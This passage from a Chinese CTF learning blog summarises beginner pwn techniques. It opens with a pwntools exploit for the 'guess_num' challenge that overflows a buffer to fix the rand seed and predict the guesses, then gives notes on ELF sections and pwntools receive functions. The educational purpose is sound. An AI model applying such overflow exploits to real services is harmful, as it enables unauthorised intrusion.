+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf &#x3D; ELF(&#39;.&#x2F;guess_num&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br></pre></td></tr></table></figure>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from ctypes import*</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.243&#39;,56846)</span><br><span class="line"></span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">p.recvuntil(&quot;Your name:&quot;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x30-0x10) + p64(1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line">for i in range(10):      #循环写法（循环10次）</span><br><span class="line">   num &#x3D; str(libc.rand()%6+1)</span><br><span class="line">   p.recvuntil(&quot;number:&quot;)</span><br><span class="line">   p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2><span id="0x004-text-data-bss等的区别">0x004 .text .data .bss等的区别</span></h2><p> 原博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p>
+<ul>
+<li><p>.text段是代码段。它用来放程序代码（code）。它通常是只读的（程序代码，编译好了就确定了，不可能改来改去的嘛）。</p>
+</li>
+<li><p>.data(ZI data)段是数据段。它用来存放初始化了的（initailized）全局变量（global）和初始化了的静态变量（static）。它是可读可写的。</p>
+</li>
+<li><p>.bss(RW data )段是全局变量数据段。它用来存放未初始化的（uninitailized）全局变量（global）和未初始化的静态变量</p>
+<p>例如：</p>
+</li>
+</ul>
+<p><img src="/images/IDA1.png" alt="IDA1"></p>
+<p><img src="/images/IDA2.png" alt="IDA2"></p>
+<p>代表pwnme（未初始化的全局变量）的地址</p>
+<p><img src="/images/IDA3.png" alt="IDA3"></p>
+<p>代表将ds赋值给eax寄存器的程序代码的地址</p>
+<h2><span id="0x005-p3264与u3264的区别">0x005 p32（64）与u32（64）的区别</span></h2><p>p32是人发给机器</p>
+<p>u32是机器发给机器</p>
+<h2><span id="0x006-precv4与precv4的区别">0x006 p.recv(4)与p.recv()[:4]的区别</span></h2><p>p.recv(4)表示接受字符数为4</p>
+<p>p.recv()[:4]表示接收到第四个字符</p>
+<p>p.recv()[2:4]表示从第二个字符接收到第四个字符</p>
+<p>p.recv()[:-1]表示一直接收</p>
+<p>p.recvuntil(\n)[:-1]代表接收除去\n的所有数</p>
+<h2><span id="0x007">0x007</span></h2><p>str()将括号内的东西打包成字符串</p>
+<p>int( ,16)将括号内东西打包成16进制数</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">makabaka</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://makabaka-yyds.github.io/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/">http://makabaka-yyds.github.io/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://makabaka-yyds.github.io" target="_blank">Makabaka</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bstring/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">攻防世界pwn新手string</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/26/IDA/" title="IDA"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-26</div><div class="title">IDA</div></div></a></div><div><a href="/2021/01/30/寄存器-偏移地址/" title="寄存器+偏移地址"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-30</div><div class="title">寄存器+偏移地址</div></div></a></div><div><a href="/2021/01/27/攻防世界cgpwn2/" title="攻防世界cgpwn2"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-27</div><div class="title">攻防世界cgpwn2</div></div></a></div><div><a href="/2021/01/30/攻防世界pwn新手level3/" title="攻防世界pwn新手level3"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-30</div><div class="title">攻防世界pwn新手level3</div></div></a></div><div><a href="/2021/01/31/攻防世界pwn新手string/" title="攻防世界pwn新手string"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-31</div><div class="title">攻防世界pwn新手string</div></div></a></div><div><a href="/2021/01/31/攻防世界pwn新手总结/" title="攻防世界pwn新手总结"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-31</div><div class="title">攻防世界pwn新手总结</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/images/tuoxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">makabaka</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 nc直接连</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 变量的覆盖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 栈溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 gets()溢出漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.1.</span> <span class="toc-text">0x001 ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.2.</span> <span class="toc-text">0x002 ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.3.</span> <span class="toc-text">0x003 ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">5.3.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞成因和基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">6.2.</span> <span class="toc-text">任意内存的读取及任意内存写入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">6.2.1.</span> <span class="toc-text">修改内存</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 strcpy漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">0x08 整数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">8.1.</span> <span class="toc-text">溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">8.2.</span> <span class="toc-text">回绕</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">8.3.</span> <span class="toc-text">截断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">0x0  杂七杂八</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.1.</span> <span class="toc-text">0x001 地址查找函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.2.</span> <span class="toc-text">0x002 关于system(&#x2F;bin&#x2F;sh)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.3.</span> <span class="toc-text">0x003 关于rand和srand</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">9.3.0.0.1.</span> <span class="toc-text">关于ctype库与dll</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">9.3.0.0.2.</span> <span class="toc-text">libc共享库</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.4.</span> <span class="toc-text">0x004 .text .data .bss等的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.5.</span> <span class="toc-text">0x005 p32（64）与u32（64）的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.6.</span> <span class="toc-text">0x006 p.recv(4)与p.recv()[:4]的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.7.</span> <span class="toc-text">0x007</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/" title="大总结"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="大总结"/></a><div class="content"><a class="title" href="/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/" title="大总结">大总结</a><time datetime="2021-02-03T06:28:48.000Z" title="发表于 2021-02-03 14:28:48">2021-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bstring/" title="攻防世界pwn新手string"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界pwn新手string"/></a><div class="content"><a class="title" href="/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bstring/" title="攻防世界pwn新手string">攻防世界pwn新手string</a><time datetime="2021-01-31T12:27:29.000Z" title="发表于 2021-01-31 20:27:29">2021-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E6%80%BB%E7%BB%93/" title="攻防世界pwn新手总结"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界pwn新手总结"/></a><div class="content"><a class="title" href="/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E6%80%BB%E7%BB%93/" title="攻防世界pwn新手总结">攻防世界pwn新手总结</a><time datetime="2021-01-31T02:17:24.000Z" title="发表于 2021-01-31 10:17:24">2021-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Blevel3/" title="攻防世界pwn新手level3"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界pwn新手level3"/></a><div class="content"><a class="title" href="/2021/01/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Blevel3/" title="攻防世界pwn新手level3">攻防世界pwn新手level3</a><time datetime="2021-01-30T14:05:03.000Z" title="发表于 2021-01-30 22:05:03">2021-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/%E5%AF%84%E5%AD%98%E5%99%A8-%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80/" title="寄存器+偏移地址"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="寄存器+偏移地址"/></a><div class="content"><a class="title" href="/2021/01/30/%E5%AF%84%E5%AD%98%E5%99%A8-%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80/" title="寄存器+偏移地址">寄存器+偏移地址</a><time datetime="2021-01-30T06:59:12.000Z" title="发表于 2021-01-30 14:59:12">2021-01-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By makabaka</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
